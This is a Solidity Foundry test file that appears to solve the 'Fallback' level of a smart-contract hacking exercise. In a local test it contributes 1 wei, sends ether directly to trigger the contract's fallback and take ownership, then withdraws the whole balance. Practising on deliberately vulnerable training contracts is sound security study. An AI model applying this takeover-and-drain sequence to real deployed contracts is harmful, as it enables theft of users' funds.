// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import { Test } from "forge-std/Test.sol";
import { Fallback } from "../src/levels/Fallback.sol";

contract Level01Test is Test {
    Fallback target;

    address attacker = makeAddr("Attacker");

    function setUp() public{
        target = new Fallback();
        vm.deal(attacker,1 ether);
    }

    function testExploit()public{
        vm.startPrank(attacker);

        target.contribute{value:1 wei}();

        (bool ok,) = address(target).call{value:1 wei}("");
        require(ok);

        assertEq(address(attacker),target.owner());

        target.withdraw();
        vm.stopPrank();

        assertEq(address(target).balance,0);

    }
}